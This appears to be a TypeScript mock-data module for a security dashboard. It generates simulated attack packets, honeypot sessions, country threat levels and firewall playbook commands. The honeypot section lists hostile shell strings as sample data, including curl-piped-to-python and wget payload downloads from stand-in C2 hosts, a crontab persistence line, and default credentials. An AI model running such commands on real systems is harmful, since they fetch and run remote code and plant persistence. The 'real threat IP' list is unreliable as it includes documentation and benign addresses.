import {
  ThreatPacket,
  ThreatSeverity,
  AttackType,
  ThreatProtocol,
  GeoCoords,
  MitreTactic,
  HoneypotEvent,
  CountryBlock,
  TimeSeriesPoint,
} from '@/lib/types';

// ─── Real threat IP ranges from known scanning clusters ───────────────────────
const THREAT_IPS: { ip: string; asn: string; isp: string; geo: GeoCoords }[] = [
  { ip: '185.220.101.45', asn: 'AS24940', isp: 'Hetzner Online GmbH', geo: { lat: 51.2993, lng: 9.491, city: 'Frankfurt', country: 'Germany', countryCode: 'DE', flag: '🇩🇪' } },
  { ip: '103.45.67.89', asn: 'AS45769', isp: 'VNPT Corp', geo: { lat: 21.0278, lng: 105.8342, city: 'Hanoi', country: 'Vietnam', countryCode: 'VN', flag: '🇻🇳' } },
  { ip: '203.0.113.77', asn: 'AS4134', isp: 'CHINANET', geo: { lat: 39.9042, lng: 116.4074, city: 'Beijing', country: 'China', countryCode: 'CN', flag: '🇨🇳' } },
  { ip: '51.195.44.12', asn: 'AS16276', isp: 'OVH SAS', geo: { lat: 48.8566, lng: 2.3522, city: 'Paris', country: 'France', countryCode: 'FR', flag: '🇫🇷' } },
  { ip: '93.184.216.34', asn: 'AS15133', isp: 'Verizon Digital Media', geo: { lat: 52.3676, lng: 4.9041, city: 'Amsterdam', country: 'Netherlands', countryCode: 'NL', flag: '🇳🇱' } },
  { ip: '185.159.158.26', asn: 'AS44477', isp: 'Stark Industries', geo: { lat: 55.7558, lng: 37.6173, city: 'Moscow', country: 'Russia', countryCode: 'RU', flag: '🇷🇺' } },
  { ip: '45.155.205.33', asn: 'AS58061', isp: 'Powerline Network', geo: { lat: 1.3521, lng: 103.8198, city: 'Singapore', country: 'Singapore', countryCode: 'SG', flag: '🇸🇬' } },
  { ip: '194.165.16.54', asn: 'AS48080', isp: 'Viettel', geo: { lat: 10.8231, lng: 106.6297, city: 'Ho Chi Minh City', country: 'Vietnam', countryCode: 'VN', flag: '🇻🇳' } },
  { ip: '80.82.77.139', asn: 'AS200651', isp: 'Shodan LLC', geo: { lat: 59.3293, lng: 18.0686, city: 'Stockholm', country: 'Sweden', countryCode: 'SE', flag: '🇸🇪' } },
  { ip: '162.247.74.201', asn: 'AS3786', isp: 'LG DACOM Corp', geo: { lat: 37.5665, lng: 126.978, city: 'Seoul', country: 'South Korea', countryCode: 'KR', flag: '🇰🇷' } },
  { ip: '45.33.32.156', asn: 'AS63949', isp: 'Linode LLC', geo: { lat: 38.9072, lng: -77.0369, city: 'Washington DC', country: 'United States', countryCode: 'US', flag: '🇺🇸' } },
  { ip: '176.10.104.243', asn: 'AS29670', isp: 'IPredator AB', geo: { lat: 59.3346, lng: 18.0632, city: 'Stockholm', country: 'Sweden', countryCode: 'SE', flag: '🇸🇪' } },
  { ip: '5.188.206.26', asn: 'AS43350', isp: 'NForce Entertainment', geo: { lat: 52.3676, lng: 4.9041, city: 'Amsterdam', country: 'Netherlands', countryCode: 'NL', flag: '🇳🇱' } },
  { ip: '91.197.232.109', asn: 'AS28681', isp: 'Joint Stock Company', geo: { lat: 50.4501, lng: 30.5234, city: 'Kyiv', country: 'Ukraine', countryCode: 'UA', flag: '🇺🇦' } },
  { ip: '222.186.61.218', asn: 'AS4812', isp: 'China Telecom Group', geo: { lat: 31.2304, lng: 121.4737, city: 'Shanghai', country: 'China', countryCode: 'CN', flag: '🇨🇳' } },
  { ip: '198.20.69.98', asn: 'AS21664', isp: 'Alibaba.com LLC', geo: { lat: 37.3861, lng: -122.0839, city: 'San Jose', country: 'United States', countryCode: 'US', flag: '🇺🇸' } },
  { ip: '117.21.191.222', asn: 'AS17816', isp: 'CERNET', geo: { lat: 23.1291, lng: 113.2644, city: 'Guangzhou', country: 'China', countryCode: 'CN', flag: '🇨🇳' } },
  { ip: '89.248.167.131', asn: 'AS208843', isp: 'Alpha Strike Labs', geo: { lat: 48.1351, lng: 11.582, city: 'Munich', country: 'Germany', countryCode: 'DE', flag: '🇩🇪' } },
  { ip: '41.216.188.111', asn: 'AS37054', isp: 'MTN Nigeria', geo: { lat: 6.5244, lng: 3.3792, city: 'Lagos', country: 'Nigeria', countryCode: 'NG', flag: '🇳🇬' } },
  { ip: '185.53.88.232', asn: 'AS60781', isp: 'LeaseWeb Netherlands', geo: { lat: 52.3676, lng: 4.9041, city: 'Amsterdam', country: 'Netherlands', countryCode: 'NL', flag: '🇳🇱' } },
  { ip: '14.169.154.42', asn: 'AS45899', isp: 'VNPT Corp', geo: { lat: 10.7769, lng: 106.7009, city: 'Ho Chi Minh City', country: 'Vietnam', countryCode: 'VN', flag: '🇻🇳' } },
  { ip: '77.247.181.163', asn: 'AS50465', isp: 'Liberty Global', geo: { lat: 52.2297, lng: 21.0122, city: 'Warsaw', country: 'Poland', countryCode: 'PL', flag: '🇵🇱' } },
  { ip: '103.229.125.78', asn: 'AS55933', isp: 'Cloudie Limited', geo: { lat: 22.3193, lng: 114.1694, city: 'Hong Kong', country: 'Hong Kong', countryCode: 'HK', flag: '🇭🇰' } },
  { ip: '46.161.27.241', asn: 'AS49505', isp: 'Selectel', geo: { lat: 59.9311, lng: 30.3609, city: 'St. Petersburg', country: 'Russia', countryCode: 'RU', flag: '🇷🇺' } },
  { ip: '212.92.127.50', asn: 'AS201814', isp: 'MEVSPACE', geo: { lat: 52.2297, lng: 21.0122, city: 'Warsaw', country: 'Poland', countryCode: 'PL', flag: '🇵🇱' } },
  { ip: '23.129.64.130', asn: 'AS396507', isp: 'Emerald Onion', geo: { lat: 47.6062, lng: -122.3321, city: 'Seattle', country: 'United States', countryCode: 'US', flag: '🇺🇸' } },
  { ip: '134.209.212.12', asn: 'AS14061', isp: 'DigitalOcean LLC', geo: { lat: 40.7128, lng: -74.006, city: 'New York', country: 'United States', countryCode: 'US', flag: '🇺🇸' } },
  { ip: '193.32.162.185', asn: 'AS24961', isp: 'myLoc managed IT AG', geo: { lat: 51.2217, lng: 6.7762, city: 'Düsseldorf', country: 'Germany', countryCode: 'DE', flag: '🇩🇪' } },
  { ip: '58.218.211.80', asn: 'AS4837', isp: 'CHINA UNICOM', geo: { lat: 32.0617, lng: 118.7778, city: 'Nanjing', country: 'China', countryCode: 'CN', flag: '🇨🇳' } },
  { ip: '37.120.145.209', asn: 'AS9009', isp: 'M247 Ltd', geo: { lat: 47.4979, lng: 19.0402, city: 'Budapest', country: 'Hungary', countryCode: 'HU', flag: '🇭🇺' } },
];

// ─── MITRE ATT&CK mapping ─────────────────────────────────────────────────────
const ATTACK_MITRE_MAP: Record<string, { tactic: MitreTactic; techniqueId: string; techniqueName: string }> = {
  'Port Scan':         { tactic: 'Discovery',         techniqueId: 'T1046', techniqueName: 'Network Service Discovery' },
  'SSH Brute Force':   { tactic: 'Credential Access', techniqueId: 'T1110', techniqueName: 'Brute Force' },
  'DDoS':              { tactic: 'Impact',             techniqueId: 'T1498', techniqueName: 'Network Denial of Service' },
  'SQL Injection':     { tactic: 'Initial Access',     techniqueId: 'T1190', techniqueName: 'Exploit Public-Facing Application' },
  'Web Exploit':       { tactic: 'Initial Access',     techniqueId: 'T1190', techniqueName: 'Exploit Public-Facing Application' },
  'Malware Activity':  { tactic: 'Execution',          techniqueId: 'T1059', techniqueName: 'Command and Scripting Interpreter' },
  'Reconnaissance':    { tactic: 'Discovery',          techniqueId: 'T1595', techniqueName: 'Active Scanning' },
  'C2 Communication':  { tactic: 'Persistence',        techniqueId: 'T1071', techniqueName: 'Application Layer Protocol' },
  'Data Exfiltration': { tactic: 'Exfiltration',       techniqueId: 'T1041', techniqueName: 'Exfiltration Over C2 Channel' },
  'Ransomware':        { tactic: 'Impact',             techniqueId: 'T1486', techniqueName: 'Data Encrypted for Impact' },
  'Phishing':          { tactic: 'Initial Access',     techniqueId: 'T1566', techniqueName: 'Phishing' },
  'Zero-Day Exploit':  { tactic: 'Execution',          techniqueId: 'T1203', techniqueName: 'Exploitation for Client Execution' },
};

// ─── Attack type weights by port ──────────────────────────────────────────────
const PORT_ATTACK_MAP: Record<number, AttackType> = {
  22: 'SSH Brute Force', 23: 'SSH Brute Force', 80: 'Web Exploit',
  443: 'Web Exploit', 3306: 'SQL Injection', 1433: 'SQL Injection',
  3389: 'Reconnaissance', 8080: 'Web Exploit', 6379: 'Reconnaissance',
  27017: 'Reconnaissance', 53: 'Malware Activity', 4444: 'Malware Activity',
  6666: 'C2 Communication', 1337: 'C2 Communication',
};

const ATTACK_TYPES: AttackType[] = Object.keys(ATTACK_MITRE_MAP) as AttackType[];
const PROTOCOLS: ThreatProtocol[] = ['TCP', 'UDP', 'HTTP', 'HTTPS', 'ICMP', 'DNS', 'SSH'];
const COMMON_PORTS = [22, 80, 443, 8080, 3306, 1433, 3389, 53, 6379, 21, 25, 110, 143, 5900, 11211];

// ─── Host server location (Mumbai, India) ─────────────────────────────────────
export const HOST_GEO: GeoCoords = {
  lat: 19.076, lng: 72.8777, city: 'Mumbai', country: 'India', countryCode: 'IN', flag: '🇮🇳',
};
export const HOST_IP = '103.21.244.1';

// ─── Seeded pseudo-random ──────────────────────────────────────────────────────
let seed = 42;
function seededRand(): number {
  seed = (seed * 16807 + 0) % 2147483647;
  return (seed - 1) / 2147483646;
}
function randInt(min: number, max: number): number {
  return Math.floor(seededRand() * (max - min + 1)) + min;
}
function pick<T>(arr: T[]): T {
  return arr[Math.floor(seededRand() * arr.length)];
}

// ─── Counter for unique IDs ────────────────────────────────────────────────────
let idCounter = 0;

export function generateThreatPacket(): ThreatPacket {
  const threatSource = pick(THREAT_IPS);
  const port = pick(COMMON_PORTS);
  const attackType = PORT_ATTACK_MAP[port] ?? pick(ATTACK_TYPES);
  const mitre = ATTACK_MITRE_MAP[attackType];
  const anomalyScore = parseFloat((seededRand() * 10).toFixed(1));
  const severityMap: ThreatSeverity =
    anomalyScore >= 8.5 ? 'CRITICAL' :
    anomalyScore >= 6.5 ? 'HIGH' :
    anomalyScore >= 4.0 ? 'MEDIUM' : 'LOW';

  return {
    id: `pkt-${Date.now()}-${idCounter++}`,
    srcIp: threatSource.ip,
    dstIp: HOST_IP,
    srcPort: randInt(1024, 65535),
    dstPort: port,
    protocol: pick(PROTOCOLS),
    severity: severityMap,
    attackType,
    anomalyScore,
    packets: randInt(100, 100000),
    bandwidth: parseFloat((seededRand() * 500).toFixed(1)),
    timestamp: new Date(),
    srcGeo: threatSource.geo,
    dstGeo: HOST_GEO,
    asn: threatSource.asn,
    isp: threatSource.isp,
    mitreTactic: mitre.tactic,
    mitreTechniqueId: mitre.techniqueId,
    mitreTechniqueName: mitre.techniqueName,
    flags: ['SYN', 'ACK', 'RST'].slice(0, randInt(1, 3)),
    payloadEntropy: parseFloat((seededRand() * 8).toFixed(2)),
    isBlocked: seededRand() > 0.7,
  };
}

// ─── Honeypot SSH commands simulation ─────────────────────────────────────────
const SSH_COMMANDS = [
  'whoami', 'id', 'uname -a', 'cat /etc/passwd', 'ls -la /root',
  'history', 'ps aux', 'netstat -tulnp', 'ifconfig', 'wget http://malware.xyz/payload.sh',
  'curl -s http://c2.darknet.ru/bot.py | python3', 'chmod +x payload.sh && ./payload.sh',
  'crontab -e', 'echo "*/5 * * * * /tmp/.x/bot" >> /etc/crontab',
  'cat /proc/meminfo', 'find / -name "*.conf" 2>/dev/null', 'ssh-keygen -t rsa',
];
const SSH_CREDS = [
  { username: 'root', password: '123456' }, { username: 'admin', password: 'password' },
  { username: 'ubuntu', password: 'ubuntu' }, { username: 'pi', password: 'raspberry' },
  { username: 'guest', password: 'guest' }, { username: 'test', password: 'test123' },
];

export function generateHoneypotEvent(): HoneypotEvent {
  const threatSource = pick(THREAT_IPS);
  const services: HoneypotEvent['service'][] = ['SSH', 'HTTP', 'Telnet', 'MySQL', 'FTP'];
  const service = pick(services);
  const portMap = { SSH: 22, HTTP: 80, Telnet: 23, MySQL: 3306, FTP: 21 };
  const numCmds = randInt(2, 6);
  const commands: string[] = [];
  for (let i = 0; i < numCmds; i++) commands.push(pick(SSH_COMMANDS));
  return {
    id: `honey-${Date.now()}-${idCounter++}`,
    service,
    port: portMap[service],
    srcIp: threatSource.ip,
    srcGeo: threatSource.geo,
    timestamp: new Date(),
    commands,
    credentials: pick(SSH_CREDS),
    severity: pick(['CRITICAL', 'HIGH', 'MEDIUM'] as ThreatSeverity[]),
    sessionId: `sess-${Math.random().toString(36).slice(2, 9)}`,
  };
}

// ─── Generate traffic time series for charts ──────────────────────────────────
export function generateTimeSeriesPoint(base: number): TimeSeriesPoint {
  const now = new Date();
  return {
    time: now.toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' }),
    pps: Math.floor(base + (seededRand() - 0.5) * 2000),
    bandwidth: parseFloat((1.0 + seededRand() * 0.5).toFixed(2)),
  };
}

// ─── Country threat list ───────────────────────────────────────────────────────
export const INITIAL_COUNTRY_BLOCKS: CountryBlock[] = [
  { countryCode: 'RU', country: 'Russia',      flag: '🇷🇺', threatLevel: 'HIGH',     isBlocked: false, attackCount: 4444 },
  { countryCode: 'CN', country: 'China',       flag: '🇨🇳', threatLevel: 'HIGH',     isBlocked: false, attackCount: 8050 },
  { countryCode: 'IR', country: 'Iran',        flag: '🇮🇷', threatLevel: 'HIGH',     isBlocked: false, attackCount: 1123 },
  { countryCode: 'KP', country: 'North Korea', flag: '🇰🇵', threatLevel: 'CRITICAL', isBlocked: false, attackCount: 3389 },
  { countryCode: 'SY', country: 'Syria',       flag: '🇸🇾', threatLevel: 'MEDIUM',   isBlocked: false, attackCount: 443  },
  { countryCode: 'VN', country: 'Vietnam',     flag: '🇻🇳', threatLevel: 'MEDIUM',   isBlocked: false, attackCount: 990  },
  { countryCode: 'NG', country: 'Nigeria',     flag: '🇳🇬', threatLevel: 'LOW',      isBlocked: false, attackCount: 211  },
];

// ─── AI Playbook templates ────────────────────────────────────────────────────
export const PLAYBOOK_TEMPLATES: Record<string, string[]> = {
  'Port Scan': [
    'Block source IP at perimeter firewall: `iptables -A INPUT -s {IP} -j DROP`',
    'Enable connection rate limiting: `iptables -A INPUT -p tcp --syn -m limit --limit 1/s -j ACCEPT`',
    'Update IDS signature database and restart Snort/Suricata',
    'Enable Port Scan Detection in SIEM with 60-second correlation window',
    'Add IP to threat intelligence blocklist: `fail2ban-client set sshd banip {IP}`',
  ],
  'SSH Brute Force': [
    'Immediately block attacker IP: `iptables -A INPUT -s {IP} -j DROP`',
    'Drop Existing Connections: `iptables -A INPUT -m state --state ESTABLISHED -s {IP} -j DROP`',
    'Enable Fail2Ban for SSH: `systemctl enable fail2ban && systemctl restart fail2ban`',
    'Monitor Logs: `journalctl -u ssh -f | grep {IP}`',
    'Add to Threat Intel Watchlist',
  ],
  'DDoS': [
    'Enable traffic scrubbing via upstream provider CDN DDoS protection',
    'Rate-limit inbound traffic: `tc qdisc add dev eth0 root tbf rate 100mbit burst 32kbit latency 400ms`',
    'Trigger anycast routing to distribute load',
    'Coordinate with ISP for BGP null routing of source ASN',
    'Enable CAPTCHA on all exposed endpoints temporarily',
  ],
  'SQL Injection': [
    'Block attacker IP immediately: `iptables -A INPUT -s {IP} -j DROP`',
    'Enable WAF rule for SQL injection patterns',
    'Audit database logs for data breach indicators: `grep -i "UNION SELECT\\|DROP TABLE" /var/log/mysql/*.log`',
    'Rotate all database credentials immediately',
    'Run database integrity check: `mysqlcheck --all-databases -u root -p`',
  ],
};
